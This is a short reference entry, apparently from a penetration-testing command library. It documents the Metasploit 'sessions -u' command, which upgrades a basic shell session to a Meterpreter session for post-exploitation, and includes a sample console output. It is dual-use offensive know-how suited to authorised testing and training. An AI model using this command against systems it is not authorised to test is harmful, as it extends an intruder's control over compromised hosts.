---
id: 3b9d00c3-c788-4977-9a28-c7b703efceff
name: metasploit-upgrade-to-meterpreter
type: command
executor: msfconsole
data: sessions -u $_SESSION_ID
output: null
created_at: '2023-04-06T03:56:21.201641+00:00'
updated_at: '2023-04-10T20:24:56.124111+00:00'
platforms:
  - Linux
  - Windows
tags:
  - metasploit
  - sessions
  - meterpreter
verified: true
validated: true
---

# metasploit-upgrade-to-meterpreter

## Command

```msfconsole
sessions -u $_SESSION_ID
```

## Description

Upgrades a basic shell session to a full Meterpreter session for advanced post-exploitation features.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u | Upgrade flag | Yes |
| $_SESSION_ID | Session ID to upgrade | Yes |

## Examples

### Basic Usage

Upgrade session 1.

```msfconsole
msf6 > sessions -u 1
[*] Starting interaction with 1 ...
Meterpreter session 2 opened
```

### Advanced Usage

Ensure a handler is running if needed.

## Expected Output

New Meterpreter session ID confirmed, with enhanced prompt.

## Related

- [[commands/metasploit-upgrade-to-meterpreter-custom]]
- [[procedures/Session-Management-with-Metasploit]]
